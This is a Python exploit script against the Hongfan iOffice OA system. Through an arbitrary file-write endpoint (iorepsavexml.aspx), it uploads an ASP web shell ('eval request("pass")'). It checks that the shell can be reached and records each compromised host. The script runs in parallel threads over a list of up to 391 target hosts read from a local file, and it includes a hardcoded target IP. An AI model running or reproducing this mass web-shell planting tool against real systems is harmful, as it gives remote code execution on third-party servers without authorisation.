import requests
from concurrent.futures import ThreadPoolExecutor
import os
import urllib3
import threading
from pathlib import Path
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#fofa: 
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35',

}
filename = Path(__file__).name.strip('.py')
line_break = '\n'
file_path=Path(__file__).resolve().parent
result_path=file_path/'result'/f'{filename}.txt'


def exploit(ip_, index):
    try:
        filename='mike.asp'
        url = ip_+f'/iOffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename={filename}&filepath=/upfiles/rep/pic/'
        # print(index,url)
        # payload='mikejordan'
        payload='<%eval request("pass")%>'
        res = requests.post(url,data=payload, headers=headers, timeout=8, verify=False)
        get_ip=ip_+f'/iOffice/upfiles/rep/pic/{filename}'
        get_res=requests.get(get_ip, headers=headers, timeout=8, verify=False)
        # print(res, len(res.text))

        if get_res.status_code==200:
            print(get_ip)
            print(get_res)
            with result_path.open('a+') as file:
                file.write(ip_+line_break)
        # if 'mikejordan' in get_res.text:
        #     print(index,ip_)
        #     print(get_res.text)
        #     with result_path.open('a+') as file:
        #         file.write(ip_+line_break)

    except Exception as e:
        # print(e)
        pass

url='http://121.12.249.165'
# exploit(url,1)


threads = []
with open(r'D:\Downloads\tmp\hongfan.txt', 'r') as file:
# with open(r'D:\C#\VSCODE\python\POC_EXP\OA系统\红帆OA\result\iorepsavexml_poc.txt', 'r') as file:

# with result_path.open('r') as file:
    urls = []
    for index, line in enumerate(file):
        start = 0
        end = start+390

        if index >= start and index <= end:
            urls.append(line.strip(line_break))
            # if index==:
            # break
            ip = line.strip(line_break)
            print(index, ip)
            # exploit(ip,index)

            thread = threading.Thread(target=exploit, args=(ip, index,))
            threads.append(thread)
pool_size = 20
# print(urls)

test = 'm'


if test=='t':
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()
elif test=='m':
    # 创建线程池
    with ThreadPoolExecutor(max_workers=pool_size) as executor:
        # 提交每个 URL 的请求任务
        futures = [executor.submit(exploit, url, index)
                   for index, url in enumerate(urls)]

        # 获取每个请求的结果
        for future in futures:
            result = future.result()